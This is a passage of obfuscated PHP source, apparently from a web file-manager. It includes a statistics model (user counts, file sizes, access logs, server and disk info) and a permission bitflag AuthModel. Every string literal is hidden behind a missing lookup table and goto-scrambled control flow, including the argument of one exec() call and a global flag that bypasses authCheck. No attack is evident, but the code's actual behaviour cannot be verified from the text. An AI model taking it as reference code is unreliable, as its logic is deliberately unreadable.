$d¶‚ä´¼”[1999], $d¶‚ä´¼”[2000])), $d¶‚ä´¼”[2001] => array($d¶‚ä´¼”[29] => $d¶‚ä´¼”[2002], $d¶‚ä´¼”[257] => array($d¶‚ä´¼”[206], $d¶‚ä´¼”[686], $d¶‚ä´¼”[2003], $d¶‚ä´¼”[2004], $d¶‚ä´¼”[2005]))); if (!isset($fÈÎõñÒ´Œ[$bŞ¿Ì…ê©‚])) { return !1; } $this->optionType = $fÈÎõñÒ´Œ[$bŞ¿Ì…ê©‚][$d¶‚ä´¼”[29]]; $this->field = $fÈÎõñÒ´Œ[$bŞ¿Ì…ê©‚][$d¶‚ä´¼”[257]]; return !0; } public function listData($a¿ºíà“Š¹ = false, $bÕº‘·±“Í = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $eÄ…·‚¤ = false) { return parent::listData($a¿ºíà“Š¹, $bÕº‘·±“Í, $eÄ…·‚¤); } public function trendList($eŒøô”•ëŒ) { goto cÀùİº§ßÃ; cÀùİº§ßÃ: $e…ÄË‰—’ =& $_SERVER[»„]; $ağƒ»Œ©« = $this->listData(); if ($ağƒ»Œ©«) { $E»‰Şš¦›ˆ = end($ağƒ»Œ©«); $eÎ¾¯Šôº† = date($e…ÄË‰—’[2006], strtotime($e…ÄË‰—’[2007])); if ($E»‰Şš¦›ˆ[$e…ÄË‰—’[206]] == $eÎ¾¯Šôº†) { return $ağƒ»Œ©«; } $Aì´«×˜–½ = strtotime($E»‰Şš¦›ˆ[$e…ÄË‰—’[206]]); } goto aÒù¹ˆ£ÉÖ; aÒù¹ˆ£ÉÖ: if (!isset($Aì´«×˜–½)) { $eÍèŠ¼œˆ¹ = $eŒøô”•ëŒ == $e…ÄË‰—’[531] ? $e…ÄË‰—’[473] : $e…ÄË‰—’[740]; $Aì´«×˜–½ = Model($eÍèŠ¼œˆ¹)->min($e…ÄË‰—’[183]); } $d§ø™á¹é‡ = $e…ÄË‰—’[2008] . ucfirst($eŒøô”•ëŒ); $E¾®â—äñå = $this->dateList($Aì´«×˜–½); goto CÀÇ¸Œò¨; CÀÇ¸Œò¨: foreach ($E¾®â—äñå as $eÎ¾¯Šôº†) { $this->{$d§ø™á¹é‡}($eÎ¾¯Šôº†); } return $this->listData(); goto b»´›ëŸ¾¶; b»´›ëŸ¾¶: } private function dateList($fò”†ÈÀÑ) { $dë©‚É½¾ =& $_SERVER[»„]; $AÛ‡“¨Êº´ = $fò”†ÈÀÑ; $D…„™´†Áİ = strtotime($dë©‚É½¾[2007]); $c‘ö´ÍĞÉŒ = array(); while ($AÛ‡“¨Êº´ <= $D…„™´†Áİ) { $c‘ö´ÍĞÉŒ[] = date($dë©‚É½¾[2006], $AÛ‡“¨Êº´); $AÛ‡“¨Êº´ = strtotime($dë©‚É½¾[2009], $AÛ‡“¨Êº´); } return $c‘ö´ÍĞÉŒ; } public function _recordUser($C†‘ÔÓÑ­© = '') { goto bä§ŸíÖåç; CÃÊ”æÂÅ: $B£±ê×Á¸ = array($cÏÕ¶¬ÏŸì[206] => $C†‘ÔÓÑ­©, $cÏÕ¶¬ÏŸì[688] => (int) $bÍÅß«Áõè, $cÏÕ¶¬ÏŸì[1999] => (int) $bÈˆ‹¯ĞÃ, $cÏÕ¶¬ÏŸì[2000] => (int) $féÑ…ÀÌ÷); return $this->insert($B£±ê×Á¸); goto cï‘é¡·›ç; fÌÆÛƒ³ß: $bÈˆ‹¯ĞÃ = Model($cÏÕ¶¬ÏŸì[473])->where($dˆ¼¸ÂÌ‚’)->count($cÏÕ¶¬ÏŸì[1409]); $dˆ¼¸ÂÌ‚’[$cÏÕ¶¬ÏŸì[29]] = $cÏÕ¶¬ÏŸì[2012]; $féÑ…ÀÌ÷ = Model($cÏÕ¶¬ÏŸì[2013])->where($dˆ¼¸ÂÌ‚’)->count($cÏÕ¶¬ÏŸì[2014]); goto CÃÊ”æÂÅ; Bğ‡¶ßµÕœ: $dˆ¼¸ÂÌ‚’ = array($cÏÕ¶¬ÏŸì[183] => array($cÏÕ¶¬ÏŸì[917], $DìÌ¼Ø·ğ)); $bÍÅß«Áõè = Model($cÏÕ¶¬ÏŸì[473])->where($dˆ¼¸ÂÌ‚’)->count($cÏÕ¶¬ÏŸì[1409]); $dˆ¼¸ÂÌ‚’[$cÏÕ¶¬ÏŸì[183]] = array($cÏÕ¶¬ÏŸì[317], array($E±Ü‰ã··í, $DìÌ¼Ø·ğ)); goto fÌÆÛƒ³ß; bä§ŸíÖåç: $cÏÕ¶¬ÏŸì =& $_SERVER[»„]; $E±Ü‰ã··í = strtotime(date($cÏÕ¶¬ÏŸì[2010], strtotime($C†‘ÔÓÑ­©))); $DìÌ¼Ø·ğ = strtotime(date($cÏÕ¶¬ÏŸì[2011], strtotime($C†‘ÔÓÑ­©))); goto Bğ‡¶ßµÕœ; cï‘é¡·›ç: } public function _recordStore($e×­ßÅÆ„ñ = '') { goto A¸ÆàøÄ’; cñ¾¸ñÚ§‰: $DåÀ‹¹ î = Model($b†áøõ’Ô[740])->where($A—ÇÌÇÏŒ)->sum($b†áøõ’Ô[77]); $F½¢ìêÔ§µ = array($b†áøõ’Ô[206] => $e×­ßÅÆ„ñ, $b†áøõ’Ô[686] => (int) $C©·¦Êçö, $b†áøõ’Ô[2003] => (int) $D»ŠÛóî¤¡, $b†áøõ’Ô[2004] => (int) $Cê¤×Ğ»ˆ, $b†áøõ’Ô[2005] => (int) $DåÀ‹¹ î); return $this->insert($F½¢ìêÔ§µ); goto b„‚åÂ¡ğ; D½Ô§‡’‚: $D»ŠÛóî¤¡ = Model($b†áøõ’Ô[418])->where($A—ÇÌÇÏŒ)->sum($b†áøõ’Ô[77]); $A—ÇÌÇÏŒ[$b†áøõ’Ô[366]] = 0; $C©·¦Êçö = Model($b†áøõ’Ô[740])->where($A—ÇÌÇÏŒ)->sum($b†áøõ’Ô[77]); goto a„äë÷—êî; a„äë÷—êî: $A—ÇÌÇÏŒ[$b†áøõ’Ô[367]] = 1; $Cê¤×Ğ»ˆ = Model($b†áøõ’Ô[740])->where($A—ÇÌÇÏŒ)->sum($b†áøõ’Ô[77]); $A—ÇÌÇÏŒ[$b†áøõ’Ô[367]] = 2; goto cñ¾¸ñÚ§‰; A¸ÆàøÄ’: $b†áøõ’Ô =& $_SERVER[»„]; $bˆª”Á›ˆ = strtotime(date($b†áøõ’Ô[2011], strtotime($e×­ßÅÆ„ñ))); $A—ÇÌÇÏŒ = array($b†áøõ’Ô[183] => array($b†áøõ’Ô[917], $bˆª”Á›ˆ)); goto D½Ô§‡’‚; b„‚åÂ¡ğ: } public function trend($eĞ¥ƒ×…Ú‚, $cï’Õˆáº›) { goto fç³óªîË; c‡ŒÏ™¶‡: return $c—¯îê’‹; goto AÏÜº‹Û†; a¨ößÑİ³ì: if (empty($B®µÓù‰‹§)) { $C¦İàøßß‚ = date($e£¶¾¢—Ü[2006], strtotime($e£¶¾¢—Ü[2007])); $BÆ¯°ŒÖ½Á = array($e£¶¾¢—Ü[206] => $C¦İàøßß‚); foreach ($b‰†§óîÜ²[$eĞ¥ƒ×…Ú‚] as $b‚˜¸´°˜à => $E£©ï†¿) { $BÆ¯°ŒÖ½Á[$b‚˜¸´°˜à] = 0; } $B®µÓù‰‹§[] = $BÆ¯°ŒÖ½Á; } $c—¯îê’‹ = array(); foreach ($B®µÓù‰‹§ as $E£©ï†¿) { if ($eĞ¥ƒ×…Ú‚ == $e£¶¾¢—Ü[2001] && $E£©ï†¿[$e£¶¾¢—Ü[2003]] > $E£©ï†¿[$e£¶¾¢—Ü[686]]) { $E£©ï†¿[$e£¶¾¢—Ü[2003]] = $E£©ï†¿[$e£¶¾¢—Ü[686]]; } foreach ($b‰†§óîÜ²[$eĞ¥ƒ×…Ú‚] as $b‚˜¸´°˜à => $F¥¿°—İ†Å) { $BĞì—‚‰«á = array($e£¶¾¢—Ü[206] => $E£©ï†¿[$e£¶¾¢—Ü[206]], $e£¶¾¢—Ü[1316] => $F¥¿°—İ†Å); $BĞì—‚‰«á[$FØİ÷ìÀÅ[$eĞ¥ƒ×…Ú‚]] = isset($E£©ï†¿[$b‚˜¸´°˜à]) ? $E£©ï†¿[$b‚˜¸´°˜à] : 0; $c—¯îê’‹[] = $BĞì—‚‰«á; } } goto c‡ŒÏ™¶‡; fç³óªîË: $e£¶¾¢—Ü =& $_SERVER[»„]; if (!$this->init($eĞ¥ƒ×…Ú‚)) { return !1; } $B®µÓù‰‹§ = $this->trendList($eĞ¥ƒ×…Ú‚); goto Aâ’É‚ìÄ; Aâ’É‚ìÄ: if ($B®µÓù‰‹§ && $cï’Õˆáº› != $e£¶¾¢—Ü[1384]) { $Dƒ†«ğ´Ğ = $B®µÓù‰‹§[0][$e£¶¾¢—Ü[206]]; $FÀßŠÔàæ¨ = $this->validDate($cï’Õˆáº›, $Dƒ†«ğ´Ğ); $d“ÄãäøÎ = array(); $C‡ïŒ¢­Ç = array_to_keyvalue($B®µÓù‰‹§, $e£¶¾¢—Ü[206]); foreach ($FÀßŠÔàæ¨ as $C¦İàøßß‚) { if (isset($C‡ïŒ¢­Ç[$C¦İàøßß‚])) { $BĞì—‚‰«á = $C‡ïŒ¢­Ç[$C¦İàøßß‚]; } else { $BĞì—‚‰«á = end($B®µÓù‰‹§); $BĞì—‚‰«á[$e£¶¾¢—Ü[206]] = $C¦İàøßß‚; if ($eĞ¥ƒ×…Ú‚ == $e£¶¾¢—Ü[531]) { $BĞì—‚‰«á[$e£¶¾¢—Ü[1999]] = $BĞì—‚‰«á[$e£¶¾¢—Ü[2000]] = 0; } } $d“ÄãäøÎ[] = $BĞì—‚‰«á; } $B®µÓù‰‹§ = $d“ÄãäøÎ; } $b‰†§óîÜ² = array($e£¶¾¢—Ü[531] => array($e£¶¾¢—Ü[688] => LNG($e£¶¾¢—Ü[2015]), $e£¶¾¢—Ü[1999] => LNG($e£¶¾¢—Ü[2016]), $e£¶¾¢—Ü[2000] => LNG($e£¶¾¢—Ü[2017])), $e£¶¾¢—Ü[2001] => array($e£¶¾¢—Ü[686] => LNG($e£¶¾¢—Ü[2018]), $e£¶¾¢—Ü[2003] => LNG($e£¶¾¢—Ü[2019]), $e£¶¾¢—Ü[2004] => LNG($e£¶¾¢—Ü[2020]), $e£¶¾¢—Ü[2005] => LNG($e£¶¾¢—Ü[2021]))); $FØİ÷ìÀÅ = array($e£¶¾¢—Ü[531] => $e£¶¾¢—Ü[2022], $e£¶¾¢—Ü[2001] => $e£¶¾¢—Ü[77]); goto a¨ößÑİ³ì; AÏÜº‹Û†: } public function validDate($B©Ê÷ÛìªÙ, $f÷š¦±è‹) { goto dÖÜ‘Å¬¸ò; dÖÜ‘Å¬¸ò: $cÚÊ’‡òÄ¸ =& $_SERVER[»„]; $AËã ®¼» = date($cÚÊ’‡òÄ¸[2006], strtotime($cÚÊ’‡òÄ¸[2007])); $fáÂáŸêÑÕ = array($AËã ®¼»); goto dŠ³öÄ·İµ; dŠ³öÄ·İµ: switch ($B©Ê÷ÛìªÙ) { case $cÚÊ’‡òÄ¸[1391]: $cœ¤ßİÇƒø = mktime(0, 0, 0, date($cÚÊ’‡òÄ¸[2023]), date($cÚÊ’‡òÄ¸[2024]) - date($cÚÊ’‡òÄ¸[1206]) + 7 - 7, date($cÚÊ’‡òÄ¸[2025])); $A”ÄšÏ = 0; do { $d¸„¹±Òâ  = date($cÚÊ’‡òÄ¸[2006], $cœ¤ßİÇƒø - 3600 * 24 * 7 * $A”ÄšÏ); $fáÂáŸêÑÕ[] = $d¸„¹±Òâ ; $A”ÄšÏ++; } while ($f÷š¦±è‹ < $d¸„¹±Òâ ); break; case $cÚÊ’‡òÄ¸[1389]: $A”ÄšÏ = 1; do { $f¸¥ØâŠºÒ = date($cÚÊ’‡òÄ¸[2026], strtotime("\x2d\x20{$A”ÄšÏ}\x20\155\x6f\156\x74\150\163")); $fáÂáŸêÑÕ[] = $f¸¥ØâŠºÒ; $A”ÄšÏ++; } while ($f÷š¦±è‹ < $f¸¥ØâŠºÒ); break; case $cÚÊ’‡òÄ¸[1694]: $BÚ‘ÖÓ…Ä† = (int) date($cÚÊ’‡òÄ¸[2025], strtotime($f÷š¦±è‹)); $fè÷•ó‡  = (int) date($cÚÊ’‡òÄ¸[2025]); if ($BÚ‘ÖÓ…Ä† >= $fè÷•ó‡ ) { break; } for ($BÚ‘ÖÓ…Ä†; $BÚ‘ÖÓ…Ä† < $fè÷•ó‡ ; $BÚ‘ÖÓ…Ä†++) { $fáÂáŸêÑÕ[] = $BÚ‘ÖÓ…Ä† . $cÚÊ’‡òÄ¸[2027]; } break; default: break; } if ($f÷š¦±è‹ > end($fáÂáŸêÑÕ)) { array_pop($fáÂáŸêÑÕ); } sort($fáÂáŸêÑÕ); goto B§¡½ñºÖã; B§¡½ñºÖã: return $fáÂáŸêÑÕ; goto fÕÛÆÅËÆó; fÕÛÆÅËÆó: } public function listTable($B‹öªÏÁ×ó) { $E¡¾‹øÊ = ucfirst($B‹öªÏÁ×ó); return Model($E¡¾‹øÊ)->listData(); } public function option($aøŞêÔ§ˆå) { $aéÓÕÔñ„Á = $_SERVER[»„][2028] . ucfirst($aøŞêÔ§ˆå); return $this->{$aéÓÕÔñ„Á}(); } private function optionUser() { goto e»ù®ã©…; bè²¡§”¬: $FÄµÌÒãœæ = Model($EÎ­¶ÓÏ‡å[473])->where($f˜«ùÉ )->count($EÎ­¶ÓÏ‡å[1409]); return array($EÎ­¶ÓÏ‡å[683] => (int) $bŸÁÆğ¥ŒÇ, $EÎ­¶ÓÏ‡å[2032] => (int) ($bŸÁÆğ¥ŒÇ - $D³–¨§Ôà), $EÎ­¶ÓÏ‡å[2033] => (int) $D³–¨§Ôà, $EÎ­¶ÓÏ‡å[2034] => (int) $FÄµÌÒãœæ, $EÎ­¶ÓÏ‡å[2035] => $Dù†åÖ°à©); goto b£‰„Îòì; c’äÛÈø: $E”†‹İÆØ = strtotime($EÎ­¶ÓÏ‡å[2030]); $f˜«ùÉ  = array($EÎ­¶ÓÏ‡å[2031] => array($EÎ­¶ÓÏ‡å[918], $E”†‹İÆØ)); $Dù†åÖ°à© = (int) Model($EÎ­¶ÓÏ‡å[473])->where($f˜«ùÉ )->count($EÎ­¶ÓÏ‡å[1409]); goto E×Á÷†Í›; e»ù®ã©…: $EÎ­¶ÓÏ‡å =& $_SERVER[»„]; $bŸÁÆğ¥ŒÇ = Model($EÎ­¶ÓÏ‡å[473])->count($EÎ­¶ÓÏ‡å[1409]); $D³–¨§Ôà = Model($EÎ­¶ÓÏ‡å[473])->where($EÎ­¶ÓÏ‡å[2029])->count($EÎ­¶ÓÏ‡å[1409]); goto c’äÛÈø; E×Á÷†Í›: if (!$Dù†åÖ°à©) { $Dù†åÖ°à© = 1; } $E”†‹İÆØ = strtotime(date($EÎ­¶ÓÏ‡å[2010])); $f˜«ùÉ  = array($EÎ­¶ÓÏ‡å[2031] => array($EÎ­¶ÓÏ‡å[918], $E”†‹İÆØ)); goto bè²¡§”¬; b£‰„Îòì: } private function optionFile() { goto cÛšÌ¦Äá¨; d¨á­˜ ‡Ÿ: $Cèçå†çšà = Model($a»®À‡ô¦Û[740])->where($d¿³î¶¸çá)->sum($a»®À‡ô¦Û[77]); $EñßËÚ–Éé = Model($a»®À‡ô¦Û[740])->where($d¿³î¶¸çá)->count($a»®À‡ô¦Û[365]); return array($a»®À‡ô¦Û[686] => $eãáØæø, $a»®À‡ô¦Û[2003] => $d ×ˆÅŒ•, $a»®À‡ô¦Û[2036] => $eãáØæø - $d ×ˆÅŒ•, $a»®À‡ô¦Û[2037] => (int) $Cèçå†çšà, $a»®À‡ô¦Û[688] => (int) $eøâ–ó„Ôö, $a»®À‡ô¦Û[2038] => (int) $EñßËÚ–Éé); goto Aƒéâ™íÂÏ; cÛšÌ¦Äá¨: $a»®À‡ô¦Û =& $_SERVER[»„]; $FóÃÎ×ç´Ì = $this->sourceSize(); $eãáØæø = $FóÃÎ×ç´Ì[$a»®À‡ô¦Û[77]]; goto f²•ô¦¡ÄÂ; f²•ô¦¡ÄÂ: $d ×ˆÅŒ• = $FóÃÎ×ç´Ì[$a»®À‡ô¦Û[2003]]; $eøâ–ó„Ôö = Model($a»®À‡ô¦Û[740])->where(array($a»®À‡ô¦Û[366] => 0))->count($a»®À‡ô¦Û[365]); $d¿³î¶¸çá = array($a»®À‡ô¦Û[366] => 0, $a»®À‡ô¦Û[183] => array($a»®À‡ô¦Û[918], strtotime(date($a»®À‡ô¦Û[2010])))); goto d¨á­˜ ‡Ÿ; Aƒéâ™íÂÏ: } private function optionAccess() { $aˆÙ¶Êõµ” =& $_SERVER[»„]; return array($aˆÙ¶Êõµ”[683] => $this->typeLogCnt(), $aˆÙ¶Êõµ”[102] => $this->typeLogCnt($aˆÙ¶Êõµ”[102]), $aˆÙ¶Êõµ”[400] => $this->typeLogCnt($aˆÙ¶Êõµ”[400]), $aˆÙ¶Êõµ”[2039] => $this->typeLogCnt($aˆÙ¶Êõµ”[2039]), $aˆÙ¶Êõµ”[2040] => $this->typeLogCnt($aˆÙ¶Êõµ”[2040]), $aˆÙ¶Êõµ”[531] => $this->typeLogCnt($aˆÙ¶Êõµ”[33], $aˆÙ¶Êõµ”[2014])); } private function typeLogCnt($CÄÇì›¹‰‡ = '', $d“ù¸Êá = "\151\144") { goto bÅŞóª¹“; bÅŞóª¹“: $bÓïÚ³Ë†ø =& $_SERVER[»„]; $d°½½¶˜— = array($bÓïÚ³Ë†ø[102] => array($bÓïÚ³Ë†ø[2041], $bÓïÚ³Ë†ø[2042]), $bÓïÚ³Ë†ø[400] => array($bÓïÚ³Ë†ø[2043], $bÓïÚ³Ë†ø[2044]), $bÓïÚ³Ë†ø[2039] => array($bÓïÚ³Ë†ø[2045], $bÓïÚ³Ë†ø[2046]), $bÓïÚ³Ë†ø[2040] => array($bÓïÚ³Ë†ø[2047], $bÓïÚ³Ë†ø[2048]), $bÓïÚ³Ë†ø[2049] => array($bÓïÚ³Ë†ø[2050], $bÓïÚ³Ë†ø[2051], $bÓïÚ³Ë†ø[2052])); $DéÖàÃß©Á = strtotime(date($bÓïÚ³Ë†ø[2010])); goto a°Ë‚Ê§Åì; a°Ë‚Ê§Åì: $c­‹òÀ‹Åµ = array($bÓïÚ³Ë†ø[183] => array($bÓïÚ³Ë†ø[918], $DéÖàÃß©Á)); if ($CÄÇì›¹‰‡) { $c­‹òÀ‹Åµ[$bÓïÚ³Ë†ø[29]] = array($bÓïÚ³Ë†ø[7], $d°½½¶˜—[$CÄÇì›¹‰‡]); } $CŞ÷Æ‘‡“± = Model($bÓïÚ³Ë†ø[2013])->where($c­‹òÀ‹Åµ)->count($d“ù¸Êá); goto C›ÄŞÒŞ‘Í; C›ÄŞÒŞ‘Í: return (int) $CŞ÷Æ‘‡“±; goto Dº‹¾Ù“ê²; Dº‹¾Ù“ê²: } private function optionServer() { goto e†½·³´áÌ; cÓ¾ßŠ•ø: if ($a˜ÀøÑóœ¿ == $Bç•Êé«‹½[712]) { $eÊÏ¨óª‰À = explode($Bç•Êé«‹½[1064], $d¦ì ÷ÒÊÌ[$Bç•Êé«‹½[877]]); $a˜ÀøÑóœ¿ = $eÊÏ¨óª‰À[0]; } if ($a˜ÀøÑóœ¿ == $Bç•Êé«‹½[715] || $a˜ÀøÑóœ¿ == $Bç•Êé«‹½[716]) { $d¸Î£Í¿»» = Model()->db()->query($Bç•Êé«‹½[2053]); $a˜ ÅÏñ‡ = $d¸Î£Í¿»»[0] && isset($d¸Î£Í¿»»[0][$Bç•Êé«‹½[1315]]) ? $d¸Î£Í¿»»[0][$Bç•Êé«‹½[1315]] : 0; $a˜ÀøÑóœ¿ = $Bç•Êé«‹½[2054] . ($a˜ ÅÏñ‡ ? $Bç•Êé«‹½[8] . $a˜ ÅÏñ‡ : $Bç•Êé«‹½[33]); } $dõõÔ¬‰Ï… = $GLOBALS[$Bç•Êé«‹½[6]][$Bç•Êé«‹½[333]][$Bç•Êé«‹½[741]]; goto e©•ÄÀŒ¦¾; e†½·³´áÌ: $Bç•Êé«‹½ =& $_SERVER[»„]; $d—ø‡ùƒÍè = $this->diskDriver(); $EÈİÎ¥ÆÏ = KodIO::defaultDriver(); goto fæà”¹ôè; e©•ÄÀŒ¦¾: return array($Bç•Êé«‹½[2055] => $d—ø‡ùƒÍè ? $d—ø‡ùƒÍè[$Bç•Êé«‹½[2056]] : 0, $Bç•Êé«‹½[2057] => $d—ø‡ùƒÍè ? $d—ø‡ùƒÍè[$Bç•Êé«‹½[2058]] : 0, $Bç•Êé«‹½[2059] => (int) $EÈİÎ¥ÆÏ[$Bç•Êé«‹½[2056]] * 1024 * 1024 * 1024, $Bç•Êé«‹½[2060] => (int) $c¦œø‘Æ…, $Bç•Êé«‹½[2061] => ucfirst($a‚â‚İİ¢Ü), $Bç•Êé«‹½[2062] => $Bç•Êé«‹½[2063] . PHP_VERSION, $Bç•Êé«‹½[2064] => phpBuild64() ? 64 : 32, $Bç•Êé«‹½[682] => str_replace($Bç•Êé«‹½[2065], $Bç•Êé«‹½[894], $a˜ÀøÑóœ¿), $Bç•Êé«‹½[333] => ucfirst($dõõÔ¬‰Ï…), $Bç•Êé«‹½[28] => $_SERVER[$Bç•Êé«‹½[2066]]); goto bÄ¼‹ÊßÜ; fæà”¹ôè: $eÌ‡˜ñ¦Õ· = array($Bç•Êé«‹½[731] => $EÈİÎ¥ÆÏ[$Bç•Êé«‹½[363]]); $c¦œø‘Æ… = Model($Bç•Êé«‹½[418])->where($eÌ‡˜ñ¦Õ·)->sum($Bç•Êé«‹½[77]); $E¶”¤ÑÕù = explode($Bç•Êé«‹½[50], $_SERVER[$Bç•Êé«‹½[137]]); goto e÷‹ÍÎÚ; e÷‹ÍÎÚ: $a‚â‚İİ¢Ü = $E¶”¤ÑÕù[0]; $d¦ì ÷ÒÊÌ = $GLOBALS[$Bç•Êé«‹½[6]][$Bç•Êé«‹½[17]]; $a˜ÀøÑóœ¿ = $d¦ì ÷ÒÊÌ[$Bç•Êé«‹½[878]]; goto cÓ¾ßŠ•ø; bÄ¼‹ÊßÜ: } private function diskDriver() { goto f»‹İçİÏì; eù¬ğÅ¯ŸÌ: $AŒçËÃ”»• = $cæ÷ÄÛÀ‘Ö - @disk_free_space($BØÁÇîŒÒÜ); return array($d½ï¹Ğ©î„[2056] => $cæ÷ÄÛÀ‘Ö, $d½ï¹Ğ©î„[2058] => $AŒçËÃ”»•); goto bª¬¿¢ÉÉà; AÑœ—ß…: if ($aßâ ¸æ”ˆ) { $BØÁÇîŒÒÜ = $d½ï¹Ğ©î„[2069]; if (function_exists($d½ï¹Ğ©î„[2070])) { exec($d½ï¹Ğ©î„[2071], $dÆÑ¨ƒÛõÇ); $BØÁÇîŒÒÜ = $dÆÑ¨ƒÛõÇ[1] . $d½ï¹Ğ©î„[8]; } } if (!file_exists($BØÁÇîŒÒÜ)) { return; } $cæ÷ÄÛÀ‘Ö = @disk_total_space($BØÁÇîŒÒÜ); goto eù¬ğÅ¯ŸÌ; f»‹İçİÏì: $d½ï¹Ğ©î„ =& $_SERVER[»„]; $BØÁÇîŒÒÜ = $d½ï¹Ğ©î„[8]; $aßâ ¸æ”ˆ = $GLOBALS[$d½ï¹Ğ©î„[6]][$d½ï¹Ğ©î„[2067]] == $d½ï¹Ğ©î„[2068]; goto AÑœ—ß…; bª¬¿¢ÉÉà: } public function fileChart($E¾ëŠ‘Şàç) { goto fñ’ø˜—; fñ’ø˜—: $eòù“›Ñ» =& $_SERVER[»„]; if (isset($E¾ëŠ‘Şàç[$eòù“›Ñ»[1409]])) { return Model($eòù“›Ñ»[740])->userFileTypeProfile($E¾ëŠ‘Şàç[$eòù“›Ñ»[1409]]); } if (isset($E¾ëŠ‘Şàç[$eòù“›Ñ»[2072]])) { return Model($eòù“›Ñ»[740])->groupFileTypeProfile($E¾ëŠ‘Şàç[$eòù“›Ñ»[2072]]); } goto E¾ÔŠå˜; fÈ¬Ú˜ÈÔ…: $BÓùš†Ÿ [$eòù“›Ñ»[367]] = 2; $Dò›Úøî— = Model($eòù“›Ñ»[740])->where($BÓùš†Ÿ )->sum($eòù“›Ñ»[77]); return array($eòù“›Ñ»[686] => $Dâô«¢ŠÒ[$eòù“›Ñ»[77]], $eòù“›Ñ»[2003] => $Dâô«¢ŠÒ[$eòù“›Ñ»[2003]], $eòù“›Ñ»[2004] => (int) $D¬¿Š´¦ŠÄ, $eòù“›Ñ»[2005] => (int) $Dò›Úøî—); goto E„™•Øö; E¾ÔŠå˜: $Dâô«¢ŠÒ = $this->sourceSize(); $BÓùš†Ÿ  = array($eòù“›Ñ»[457] => 0, $eòù“›Ñ»[367] => 1); $D¬¿Š´¦ŠÄ = Model($eòù“›Ñ»[740])->where($BÓùš†Ÿ )->sum($eòù“›Ñ»[77]); goto fÈ¬Ú˜ÈÔ…; E„™•Øö: } private function sourceSize() { $f½ÉÁ†óÜš =& $_SERVER[»„]; $AÜ¸«íñİĞ = Model($f½ÉÁ†óÜš[740])->where(array($f½ÉÁ†óÜš[366] => 0))->sum($f½ÉÁ†óÜš[77]); $bÓö§½¼¦ = Model($f½ÉÁ†óÜš[418])->sum($f½ÉÁ†óÜš[77]); if ($bÓö§½¼¦ > $AÜ¸«íñİĞ) { $bÓö§½¼¦ = $AÜ¸«íñİĞ; } return array($f½ÉÁ†óÜš[77] => (int) $AÜ¸«íñİĞ, $f½ÉÁ†óÜš[2003] => (int) $bÓö§½¼¦); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $E¨½Âˆíù =& $_SERVER[»„]; $a’‚È²Ì£À = array(array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2073]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2075], $E¨½Âˆíù[2076] => 6, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2079]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2080], $E¨½Âˆíù[2076] => 1, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2081]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2082], $E¨½Âˆíù[2076] => 2, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2083]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2082], $E¨½Âˆíù[2076] => 3, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2084]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2085], $E¨½Âˆíù[2076] => 4, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_VIEW), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2086]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2087], $E¨½Âˆíù[2076] => 5, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($E¨½Âˆíù[382] => LNG($E¨½Âˆíù[2088]), $E¨½Âˆíù[2074] => $E¨½Âˆíù[2089], $E¨½Âˆíù[2076] => 7, $E¨½Âˆíù[2077] => 1, $E¨½Âˆíù[2078] => 0)); return $a’‚È²Ì£À; } public static function authCheck($CÊÆ‡’Ğ’, $A±‹‹ƒÒ¬) { $CÊÆ‡’Ğ’ = intval($CÊÆ‡’Ğ’); if (_get($GLOBALS, $_SERVER[»„][453])) { return !0; } if ($CÊÆ‡’Ğ’ <= 0) { return !1; } if (($CÊÆ‡’Ğ’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($CÊÆ‡’Ğ’ & $A±‹‹ƒÒ¬); } public static function authCheckShow($b„õŒøÛ) { return self::authCheck($b„õŒøÛ, self::AUTH_SHOW); } public static function authCheckView($eÕÆÑ¦‹•ã) { return self::authCheck($eÕÆÑ¦‹•ã, self::AUTH_VIEW); } public static function authCheckDownload($E°ã‚À×¦™) { return self::authCheck($E°ã‚À×¦™, self::AUTH_DOWNLOAD); } public static function authCheckUpload($A––Üµ¿ò) { return self::authCheck($A––Üµ¿ò, self::AUTH_UPLOAD); } public static function authCheckEdit($fÙ³æŒ·£ç) { return self::authCheck($fÙ³æŒ·£ç, self::AUTH_EDIT); } public static function authCheckRemove($aÌ©†À†­) { return self::authCheck($aÌ©†À†­, self::AUTH_REMOVE); } public static function authCheckShare($d¶¶¹ãèÙµ) { return 